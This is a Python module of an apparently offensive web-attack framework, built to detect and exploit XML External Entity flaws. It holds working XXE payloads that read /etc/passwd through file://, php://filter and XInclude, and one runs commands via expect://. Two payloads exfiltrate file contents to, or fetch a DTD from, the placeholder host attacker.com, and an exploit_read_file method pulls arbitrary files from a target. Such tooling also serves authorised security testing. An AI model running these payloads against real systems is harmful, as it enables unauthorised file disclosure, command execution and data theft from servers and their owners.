#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - XXE Module
XML External Entity detection and exploitation
"""

from config import Payloads, Colors


class XXEModule:
    """XXE Testing Module"""

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "XXE"

        # XXE indicators – only strong indicators (actual file content
        # that proves file retrieval) count towards detection.  Weak
        # indicators (generic XML keywords like SYSTEM, PUBLIC) are
        # ignored because they appear in normal XML responses.
        self.xxe_strong_indicators = [
            "root:x:",
            "bin:x:",
            "daemon:x:",
            "/bin/bash",
            "for 16-bit app support",
            "[extensions]",
        ]
        self.xxe_weak_indicators = [
            "/etc/passwd",
            "<!ENTITY",
            "SYSTEM",
            "PUBLIC",
            "file://",
            "php://",
        ]

    def test(self, url: str, method: str, param: str, value: str):
        """Test for XXE"""
        # Test basic XXE
        self._test_basic(url, method, param, value)

        # Test with different techniques
        self._test_variants(url, method, param, value)

        # Test CDATA and encoding variations
        self._test_cdata_and_encoding(url, method, param, value)

    def test_url(self, url: str):
        """Test URL for XXE"""

    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic XXE"""
        payloads = Payloads.XXE_PAYLOADS

        # Get baseline to ignore indicators already present
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline.text.lower() if baseline else ""
        except Exception:
            baseline_text = ""

        for payload in payloads:
            try:
                headers = {"Content-Type": "application/xml"}

                if method.upper() == "GET":
                    data = {param: payload}
                    response = self.requester.request(url, method, data=data)
                else:
                    # Send raw XML body for POST
                    response = self.requester.request(url, method, data=payload.encode("utf-8"), headers=headers)

                if not response:
                    continue

                response_text = response.text.lower()

                # Only count strong indicators (actual file content) that
                # are NEW – i.e. not present in the baseline response
                new_strong = sum(
                    1
                    for ind in self.xxe_strong_indicators
                    if ind.lower() in response_text and ind.lower() not in baseline_text
                )

                if new_strong >= 2:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XXE (XML External Entity)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=payload[:100],
                        evidence="XXE vulnerability detected - file content retrieved",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'XXE test error: {e}')}")

    def _test_variants(self, url: str, method: str, param: str, value: str):
        """Test XXE variants"""
        variants = [
            # Parameter entity
            """<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
]>
<data>&exfil;</data>""",
            # OOB (Out-of-band)
            """<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>""",
            # PHP expect
            """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>""",
            # PHP filter
            """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>""",
        ]

        for payload in variants:
            try:
                headers = {"Content-Type": "application/xml"}
                response = self.requester.request(url, "POST", data=payload.encode("utf-8"), headers=headers)

                if not response:
                    continue

                # Check for indicators
                if "root:x:" in response.text or "bin:x:" in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XXE (Advanced)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=payload[:100],
                        evidence="XXE variant successful",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'XXE variant test error: {e}')}")

    def _test_cdata_and_encoding(self, url: str, method: str, param: str, value: str):
        """Test XXE with CDATA sections and encoding variations"""
        payloads = [
            # CDATA exfiltration
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % dtd "<!ENTITY all \'%start;%file;%end;\'>">%dtd;]><data>&all;</data>',
            # SVG-based XXE
            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
            # SOAP-based XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
            # XInclude
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            # UTF-16 encoded
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
        for payload in payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                response = self.requester.request(url, "POST", data=payload.encode("utf-8"), headers=headers)
                if not response:
                    continue
                text = response.text.lower()
                strong_count = sum(1 for ind in self.xxe_strong_indicators if ind.lower() in text)
                if strong_count >= 2:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XXE (Advanced Technique)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=payload[:100],
                        evidence="XXE via advanced technique - file content retrieved",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def exploit_read_file(self, url: str, file_path: str) -> str:
        """Attempt to read file via XXE"""
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>"""

        try:
            headers = {"Content-Type": "application/xml"}
            response = self.requester.request(url, "POST", data=payload.encode("utf-8"), headers=headers)

            if response:
                return response.text
        except Exception as e:
            print(f"{Colors.error(f'XXE file read error: {e}')}")

        return None
